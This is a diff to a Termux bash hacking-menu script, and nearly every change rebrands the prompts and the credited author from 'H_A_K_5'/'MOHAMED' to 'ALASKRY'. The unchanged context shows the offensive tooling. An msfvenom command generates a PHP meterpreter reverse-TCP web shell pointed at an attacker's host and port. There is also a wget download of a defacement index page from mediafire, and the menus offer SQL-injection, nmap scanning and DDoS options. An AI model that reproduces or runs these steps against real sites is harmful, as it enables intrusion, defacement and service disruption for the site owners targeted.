@@ -495,7 +495,7 @@ web(){
 	echo -e "$green [$red 2 $green]$cyan TERMUX\n"
 	echo -e "$green [$red 0 $green]$cyan Back \n"
 	echo -e $white
-	read -p "[ H_A_K_5 / WEB ]~# " web
+	read -p "[ ALASKRY .EG / WEB ]~# " web
 	if [ "$web" = "1" ] ; then
 		pict
 		echo -e "\n\n\n"
@@ -514,7 +514,7 @@ web(){
 		printf "$green[$white 0 $green]$blue BACK" ;sleep 0.2
 		echo -e "$white"
 		echo ""
-		read -p "[ H_A_K_5 / WEB_HAK ]~# " web1
+		read -p "[ ALASKRY .EG / WEB_HAK ]~# " web1
 		if [ $web1 = 1 ]; then
 			SQL_s
 		elif [ $web1 = 2  ]; then
@@ -551,7 +551,7 @@ web(){
 		printf "$green[$white 0 $green]$blue BACK" ;sleep 0.2
 		echo -e "$white"
 		echo ""
-		read -p "[ H_A_K_5 / WEB_HAK ]~# " web2 
+		read -p "[ ALASKRY .EG / WEB_HAK ]~# " web2 
 		if [ "$web2" = "1" ];then
 			clear
 			echo -e $red
@@ -597,7 +597,7 @@ web(){
 			read -p "Enter the Name: " name
 			echo -e "$green [~] $yellow Make SheLL..."
 			msfvenom -p php/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f raw > $name.php
-			mv $name.php /sdcard/HAK5
+			mv $name.php /sdcard/ALASKRY
 			clear
 			echo -e "$green[$cyan*$green] $green Done $white>>$yellow The SheLL in /sdcard/HAK5 "
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
@@ -630,7 +630,7 @@ index-t(){
 		echo -e "$red[*] $yellow Starting..."
 		sleep 2
 		wget http://download2265.mediafire.com/zm8669wvt0cg/909e0drdp0yemi3/index_web.zip ;mv index_web.zip /sdcard/HAK5
-		clear ;echo -e "$cyan The INDEX in HAK5 " ;sleep 4 ; web
+		clear ;echo -e "$cyan The INDEX in ALASKRY " ;sleep 4 ; web
 	elif [ "$in" = "n" ] || [ "$in" = "N" ]; then
 		web
 	else :
@@ -646,7 +646,7 @@ index(){
 		echo -e "$red[*] $yellow Starting..."
 		sleep 2
 		wget http://download2265.mediafire.com/zm8669wvt0cg/909e0drdp0yemi3/index_web.zip 
-		clear ;echo -e "$cyan The INDEX in HAK5 " ;sleep 4 ; web
+		clear ;echo -e "$cyan The INDEX in ALASKRY " ;sleep 4 ; web
 	elif [ "$in" = "n" ] || [ "$in" = "N" ]; then
 		web
 	else :
@@ -747,7 +747,7 @@ nmap-p(){
 	echo -e "$red[$cyan 14 $red] $white IP protocol scan" ;sleep 0.2
 	echo -e "$red[$cyan 15 $red] $white Back" ;sleep 0.2
 	echo -e $white
-	read -p "[ H_A_K_5 / SCan_HAK ]~# " scan
+	read -p "[ ALASKRY .E.G / SCan_HAK ]~# " scan
 	if [ $scan = 1  ];then 
 		s_p
 		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
@@ -864,12 +864,12 @@ nmap-p(){
 	elif [ $scan = 0 ]; then
 		clear
 		echo -e $green
-		figlet "		MOHAMED"
+		figlet "      alaskry. EG"
 		echo -e "$red++++++++++++++++++++++++++++++++++++++" 
 		sleep 0.2
-		echo -e "$yellow By : $green MOHAMED $cyan HACKER"
+		echo -e "$yellow By : $green ALASKRY $cyan ALASKRY"
 		sleep 0.2
-		echo -e "$yellow Telegram $red @HcmohtatefOfficial"
+		echo -e "$yellow Telegram $red @a7med_alaskry"
 		sleep 0.2
 		echo -e "$red++++++++++++++++++++++++++++++++++++++" 
 		sleep 2
@@ -935,7 +935,7 @@ TOoLs(){
 	printf "$yellow [ $red 00 $yellow ] $cyan Back\n"
 	printf "$white"
 	echo
-	read -p "[ H_A_K_5 / TOoL ]~# " tool
+	read -p "[ ALASKRY .EG / TOoL ]~# " tool
 	if [ $tool = 1 ];then
 		clear
 		echo -e $red
@@ -1116,7 +1116,7 @@ ddos(){
 	echo -e "$white[$red 4 $white] $green xerxes\n" ;sleep 0.2
 	echo -e "$white[$red 0 $white] $green Back\n" ;sleep 0.2
 	echo -e $white
-	read -p "[ H_A_K_5 / DDos ]~# " ddos
+	read -p "[ ALASKRY / DDos ]~# " ddos
 	if [ $ddos = 1 ];then
 		clear 
 		figlet ToR
@@ -1191,9 +1191,9 @@ exit(){
 
 	echo -e "$red++++++++++++++++++++++++++++++++++++++" 
 	sleep 0.2
-	echo -e "$yellow By : $green MOHAMED $cyan HACKER"
+	echo -e "$yellow By : $green ALASKRY $cyan ALASKRY"
 	sleep 0.2
-	echo -e "$yellow Telegram $red @HcmohtatefOfficial"
+	echo -e "$yellow Telegram $red @a7med_alaskry"
 	sleep 0.2
 	echo -e "$red++++++++++++++++++++++++++++++++++++++" 
 			                                                                                
